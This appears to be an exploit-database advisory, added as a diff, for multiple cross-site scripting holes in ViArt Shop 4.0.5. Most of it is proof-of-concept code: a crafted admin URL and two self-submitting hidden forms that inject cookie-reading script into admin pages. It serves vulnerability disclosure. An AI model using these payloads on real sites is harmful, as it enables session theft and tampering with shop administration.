@@ -1,0 +1,46 @@
+source: http://www.securityfocus.com/bid/46256/info
+
+ViArt Shop is prone to multiple cross-site-scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+ViArt Shop 4.0.5 is vulnerable; other versions may also be affected. 
+
+1. http://www.example.com/admin/admin_product.php?category_id=0&item_id=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+2. <form action="http://www.example.com/admin/admin_global_settings.php" method="post" name="main">
+<input type="hidden" name="operation" value="save">
+<input type="hidden" name="rp" value="admin.php">
+<input type="hidden" name="tab" value="general">
+<input type="hidden" name="site_name" value="Default Site">
+<input type="hidden" name="site_url" value="http://host/">
+<input type="hidden" name="admin_email" value="email@example.com">
+<input type="hidden" name="layout_id" value="1">
+<input type="hidden" name="password_encrypt" value="0">
+<input type="hidden" name="admin_password_encrypt" value="0">
+<input type="hidden" name="html_below_footer" value=&#039;12345"><script>alert(document.cookie)</script>&#039;>
+
+<input type="hidden" name="operation" value="save">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+3. <form action="http://www.example.com/admin/admin_manufacturer.php" method="post" name="main">
+<input type="hidden" name="operation" value="save">
+<input type="hidden" name="manufacturer_id" value="3">
+<input type="hidden" name="manufacturer_name" value=&#039;Company"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="manufacturer_order" value="1">
+<input type="hidden" name="friendly_url" value="">
+<input type="hidden" name="affiliate_code" value="">
+<input type="hidden" name="short_description" value="">
+<input type="hidden" name="full_description" value="">
+<input type="hidden" name="image_small" value="images/manufacturers/small/company.gif">
+<input type="hidden" name="image_small_alt" value="company">
+<input type="hidden" name="image_large" value="images/manufacturers/large/company.gif">
+<input type="hidden" name="image_large_alt" value="company">
+</form>
+<script>
+document.main.submit();
+</script>
